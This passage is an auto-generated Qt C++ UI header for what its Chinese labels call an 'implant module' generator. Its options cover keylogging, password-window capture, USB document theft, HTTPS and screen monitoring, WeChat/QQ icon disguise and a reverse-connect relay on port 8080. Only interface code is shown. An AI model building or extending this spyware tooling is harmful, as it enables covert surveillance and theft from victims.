        verticalLayout_4->addItem(verticalSpacer);


        verticalLayout_5->addWidget(groupBox_6);

        tabWidget->addTab(tab_2, QString());

        horizontalLayout_8->addWidget(tabWidget);


        verticalLayout->addLayout(horizontalLayout_8);

        horizontalLayout = new QHBoxLayout();
        horizontalLayout->setSpacing(6);
        horizontalLayout->setObjectName(QString::fromUtf8("horizontalLayout"));
        horizontalSpacer = new QSpacerItem(40, 20, QSizePolicy::Expanding, QSizePolicy::Minimum);

        horizontalLayout->addItem(horizontalSpacer);

        btnOk = new QPushButton(GenerateDlg);
        btnOk->setObjectName(QString::fromUtf8("btnOk"));

        horizontalLayout->addWidget(btnOk);

        btnCancel = new QPushButton(GenerateDlg);
        btnCancel->setObjectName(QString::fromUtf8("btnCancel"));

        horizontalLayout->addWidget(btnCancel);


        verticalLayout->addLayout(horizontalLayout);


        retranslateUi(GenerateDlg);

        tabWidget->setCurrentIndex(0);


        QMetaObject::connectSlotsByName(GenerateDlg);
    } // setupUi

    void retranslateUi(QDialog *GenerateDlg)
    {
        GenerateDlg->setWindowTitle(QApplication::translate("GenerateDlg", "\347\224\237\346\210\220\346\244\215\345\205\245\346\250\241\345\235\227", 0, QApplication::UnicodeUTF8));

        const bool __sortingEnabled = lstPlatform->isSortingEnabled();
        lstPlatform->setSortingEnabled(false);
        QListWidgetItem *___qlistwidgetitem = lstPlatform->item(0);
        ___qlistwidgetitem->setText(QApplication::translate("GenerateDlg", "Windows", 0, QApplication::UnicodeUTF8));
        QListWidgetItem *___qlistwidgetitem1 = lstPlatform->item(1);
        ___qlistwidgetitem1->setText(QApplication::translate("GenerateDlg", "Mac OS", 0, QApplication::UnicodeUTF8));
        QListWidgetItem *___qlistwidgetitem2 = lstPlatform->item(2);
        ___qlistwidgetitem2->setText(QApplication::translate("GenerateDlg", "IOS", 0, QApplication::UnicodeUTF8));
        QListWidgetItem *___qlistwidgetitem3 = lstPlatform->item(3);
        ___qlistwidgetitem3->setText(QApplication::translate("GenerateDlg", "Android", 0, QApplication::UnicodeUTF8));
        lstPlatform->setSortingEnabled(__sortingEnabled);

        groupBox->setTitle(QApplication::translate("GenerateDlg", "\346\250\241\345\235\227\346\240\207\350\257\206", 0, QApplication::UnicodeUTF8));
        label->setText(QApplication::translate("GenerateDlg", "\346\240\207\350\257\206ID", 0, QApplication::UnicodeUTF8));
        edtGroupId->setText(QApplication::translate("GenerateDlg", "10000", 0, QApplication::UnicodeUTF8));
        grpNetEnvironment->setTitle(QApplication::translate("GenerateDlg", "\347\275\221\347\273\234\347\216\257\345\242\203", 0, QApplication::UnicodeUTF8));
        chkWIFI->setText(QApplication::translate("GenerateDlg", "\346\227\240\347\272\277 WIFI", 0, QApplication::UnicodeUTF8));
        chk3G->setText(QApplication::translate("GenerateDlg", "3G \347\275\221\347\273\234", 0, QApplication::UnicodeUTF8));
        grpEnvironment->setTitle(QApplication::translate("GenerateDlg", "\346\250\241\345\235\227\350\277\220\350\241\214\347\216\257\345\242\203", 0, QApplication::UnicodeUTF8));
        chkRemote->setText(QApplication::translate("GenerateDlg", "PC \347\253\257\345\256\211\350\243\205", 0, QApplication::UnicodeUTF8));
        chkLocal->setText(QApplication::translate("GenerateDlg", "\347\247\273\345\212\250\347\253\257\345\256\211\350\243\205", 0, QApplication::UnicodeUTF8));
        label_11->setText(QApplication::translate("GenerateDlg", "\350\256\276\347\275\256apk\345\233\276\346\240\207\357\274\232", 0, QApplication::UnicodeUTF8));
        cmbApkIcon->clear();
        cmbApkIcon->insertItems(0, QStringList()
         << QApplication::translate("GenerateDlg", "\345\276\256\344\277\241", 0, QApplication::UnicodeUTF8)
         << QApplication::translate("GenerateDlg", "QQ", 0, QApplication::UnicodeUTF8)
        );
        grpRoot->setTitle(QApplication::translate("GenerateDlg", "\347\233\256\346\240\207\346\230\257\345\220\246\346\213\245\346\234\211root\346\235\203\351\231\220", 0, QApplication::UnicodeUTF8));
        chkRooted->setText(QApplication::translate("GenerateDlg", "\346\213\245\346\234\211root\346\235\203\351\231\220", 0, QApplication::UnicodeUTF8));
        chkNotRooted->setText(QApplication::translate("GenerateDlg", "\346\262\241\346\234\211root\346\235\203\351\231\220", 0, QApplication::UnicodeUTF8));
        groupBox_2->setTitle(QApplication::translate("GenerateDlg", "\346\250\241\345\235\227\351\233\206\346\210\220\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkPlg3->setText(QApplication::translate("GenerateDlg", "USB \346\226\207\344\273\266\345\217\226\345\257\206\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        checkBox->setText(QApplication::translate("GenerateDlg", "\344\270\273\345\212\237\350\203\275\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkPlg2->setText(QApplication::translate("GenerateDlg", "\347\224\250\346\210\267\350\241\214\344\270\272\347\233\221\346\216\247\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkPlg4->setText(QApplication::translate("GenerateDlg", "\345\261\217\345\271\225\347\233\221\346\216\247\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        groupBox_3->setTitle(QApplication::translate("GenerateDlg", "\344\270\273\344\270\255\350\275\254\346\234\215\345\212\241\345\231\250", 0, QApplication::UnicodeUTF8));
        cmbIp1->clear();
        cmbIp1->insertItems(0, QStringList()
         << QApplication::translate("GenerateDlg", "ip\345\234\260\345\235\200", 0, QApplication::UnicodeUTF8)
         << QApplication::translate("GenerateDlg", "\345\237\237\345\220\215", 0, QApplication::UnicodeUTF8)
        );
        label_2->setText(QApplication::translate("GenerateDlg", "\345\217\215\345\274\271\347\253\257\345\217\243", 0, QApplication::UnicodeUTF8));
        edtPort->setText(QApplication::translate("GenerateDlg", "8080", 0, QApplication::UnicodeUTF8));
        btnGetIP->setText(QApplication::translate("GenerateDlg", "\350\247\243\346\236\220", 0, QApplication::UnicodeUTF8));
        chkAlternate->setTitle(QApplication::translate("GenerateDlg", "\345\244\207\347\224\250\344\270\255\350\275\254\346\234\215\345\212\241\345\231\250", 0, QApplication::UnicodeUTF8));
        cmbIp2->clear();
        cmbIp2->insertItems(0, QStringList()
         << QApplication::translate("GenerateDlg", "ip\345\234\260\345\235\200", 0, QApplication::UnicodeUTF8)
         << QApplication::translate("GenerateDlg", "\345\237\237\345\220\215", 0, QApplication::UnicodeUTF8)
        );
        label_3->setText(QApplication::translate("GenerateDlg", "\345\217\215\345\274\271\347\253\257\345\217\243", 0, QApplication::UnicodeUTF8));
        edtAlternatePort->setText(QApplication::translate("GenerateDlg", "8080", 0, QApplication::UnicodeUTF8));
        btnGetIP2->setText(QApplication::translate("GenerateDlg", "\350\247\243\346\236\220", 0, QApplication::UnicodeUTF8));
        tabWidget->setTabText(tabWidget->indexOf(tab), QApplication::translate("GenerateDlg", "\346\244\215\345\205\245\346\250\241\345\235\227\351\205\215\347\275\256", 0, QApplication::UnicodeUTF8));
        groupBox_4->setTitle(QApplication::translate("GenerateDlg", "\347\224\250\346\210\267\350\241\214\344\270\272\347\233\221\346\216\247\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkFileOp->setText(QApplication::translate("GenerateDlg", "\347\224\250\346\210\267\346\226\207\344\273\266\346\223\215\344\275\234\350\275\250\350\277\271", 0, QApplication::UnicodeUTF8));
        chkProcessOp->setText(QApplication::translate("GenerateDlg", "\350\277\233\347\250\213\346\226\207\344\273\266\350\256\277\351\227\256\350\275\250\350\277\271", 0, QApplication::UnicodeUTF8));
        chkKeyboardOp->setText(QApplication::translate("GenerateDlg", "\351\224\256\347\233\230\350\256\260\345\275\225", 0, QApplication::UnicodeUTF8));
        chkExecuteOp->setText(QApplication::translate("GenerateDlg", "\350\277\233\347\250\213\346\211\247\350\241\214\350\275\250\350\277\271", 0, QApplication::UnicodeUTF8));
        chkClipboardOp->setText(QApplication::translate("GenerateDlg", "\345\211\252\350\264\264\346\235\277\344\277\241\346\201\257", 0, QApplication::UnicodeUTF8));
        grpPassword->setTitle(QApplication::translate("GenerateDlg", "Win32\347\250\213\345\272\217\"\345\257\206\347\240\201\347\252\227\345\217\243\"\350\207\252\345\212\250\350\257\206\345\210\253", 0, QApplication::UnicodeUTF8));
        chkEA_PASSWORD->setText(QApplication::translate("GenerateDlg", "\347\274\226\350\276\221\346\241\206EA_PASSWORD\345\261\236\346\200\247\345\214\271\351\205\215", 0, QApplication::UnicodeUTF8));
        chkKeyword->setText(QApplication::translate("GenerateDlg", "\347\252\227\345\217\243\346\240\207\351\242\230\345\205\263\351\224\256\345\255\227\345\214\271\351\205\215[\346\224\257\346\214\201\345\244\232\345\233\275\350\257\255\350\250\200]", 0, QApplication::UnicodeUTF8));
        edtKeyword->setText(QApplication::translate("GenerateDlg", "\345\257\206\347\240\201;\345\217\243\344\273\244;Password;", 0, QApplication::UnicodeUTF8));
        grpDeleteFile->setTitle(QApplication::translate("GenerateDlg", "\345\210\240\351\231\244\346\226\207\344\273\266\350\216\267\345\217\226", 0, QApplication::UnicodeUTF8));
        label_8->setText(QApplication::translate("GenerateDlg", "\346\211\251\345\261\225\345\220\215\350\277\207\346\273\244\357\274\232", 0, QApplication::UnicodeUTF8));
        edtDeleteFileExt->setText(QApplication::translate("GenerateDlg", "*.doc;*.ppt;*.xls;*.docx;*.pptx;*.xlsx;", 0, QApplication::UnicodeUTF8));
        grpHttps->setTitle(QApplication::translate("GenerateDlg", "https\346\212\245\346\226\207\347\233\221\346\216\247", 0, QApplication::UnicodeUTF8));
        chkHttpsSend->setText(QApplication::translate("GenerateDlg", "\347\233\221\346\216\247\345\217\221\351\200\201\346\212\245\346\226\207", 0, QApplication::UnicodeUTF8));
        chkHttpsReceive->setText(QApplication::translate("GenerateDlg", "\347\233\221\346\216\247\346\216\245\346\224\266\346\225\260\346\215\256", 0, QApplication::UnicodeUTF8));
        tabWidget->setTabText(tabWidget->indexOf(tab_3), QApplication::translate("GenerateDlg", "\347\224\250\346\210\267\350\241\214\344\270\272\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        grpUsb->setTitle(QApplication::translate("GenerateDlg", "USB\346\226\207\344\273\266\345\257\206\345\217\226\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkUsbPlug->setText(QApplication::translate("GenerateDlg", "USB\350\256\276\345\244\207\346\217\222\346\213\224\350\241\214\344\270\272\347\233\221\346\216\247", 0, QApplication::UnicodeUTF8));
        chkUsbDir->setText(QApplication::translate("GenerateDlg", "USB\347\233\256\345\275\225\345\210\227\350\241\250\350\216\267\345\217\226", 0, QApplication::UnicodeUTF8));
        chkUsbFileRetrieve->setText(QApplication::translate("GenerateDlg", "USB\346\226\207\344\273\266\350\216\267\345\217\226", 0, QApplication::UnicodeUTF8));
        label_4->setText(QApplication::translate("GenerateDlg", "\346\226\207\344\273\266\346\211\251\345\261\225\345\220\215\350\277\207\346\273\244", 0, QApplication::UnicodeUTF8));
        edtUsbExt->setText(QApplication::translate("GenerateDlg", "*.doc;*.ppt;*.xls;*.docx;*.pptx;*.xlsx;", 0, QApplication::UnicodeUTF8));
        label_5->setText(QApplication::translate("GenerateDlg", "\350\216\267\345\217\226\346\226\207\344\273\266\346\234\200\345\244\247\351\225\277\345\272\246", 0, QApplication::UnicodeUTF8));
        label_6->setText(QApplication::translate("GenerateDlg", "MB", 0, QApplication::UnicodeUTF8));
        groupBox_6->setTitle(QApplication::translate("GenerateDlg", "\345\261\217\345\271\225\347\233\221\346\216\247\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        chkScreenManual->setText(QApplication::translate("GenerateDlg", "\346\211\213\345\267\245\346\210\252\345\217\226\347\233\256\346\240\207\345\261\217\345\271\225", 0, QApplication::UnicodeUTF8));
        chkSmartCapture->setText(QApplication::translate("GenerateDlg", "\346\231\272\350\203\275\346\210\252\345\217\226\347\233\256\346\240\207\347\252\227\345\217\243", 0, QApplication::UnicodeUTF8));
        label_7->setText(QApplication::translate("GenerateDlg", "\350\277\233\347\250\213\345\220\215\350\277\207\346\273\244", 0, QApplication::UnicodeUTF8));
        edtProcName->setText(QApplication::translate("GenerateDlg", "notepad;", 0, QApplication::UnicodeUTF8));
        lbWindowTitle->setText(QApplication::translate("GenerateDlg", "\347\252\227\345\217\243\345\205\263\351\224\256\345\255\227", 0, QApplication::UnicodeUTF8));
        edtWindowTitle->setText(QString());
        label_9->setText(QApplication::translate("GenerateDlg", "\347\252\227\345\217\243\346\210\252\345\217\226\351\227\264\351\232\224", 0, QApplication::UnicodeUTF8));
        label_10->setText(QApplication::translate("GenerateDlg", "\347\247\222", 0, QApplication::UnicodeUTF8));
        tabWidget->setTabText(tabWidget->indexOf(tab_2), QApplication::translate("GenerateDlg", "USB\345\217\212\345\261\217\345\271\225\346\217\222\344\273\266", 0, QApplication::UnicodeUTF8));
        btnOk->setText(QApplication::translate("GenerateDlg", "\347\224\237\346\210\220", 0, QApplication::UnicodeUTF8));
        btnCancel->setText(QApplication::translate("GenerateDlg", "\345\217\226\346\266\210", 0, QApplication::UnicodeUTF8));
    } // retranslateUi

};

namespace Ui {
    class GenerateDlg: public Ui_GenerateDlg {};
} // namespace Ui

QT_END_NAMESPACE

#endif // UI_GENERATEDLG_H
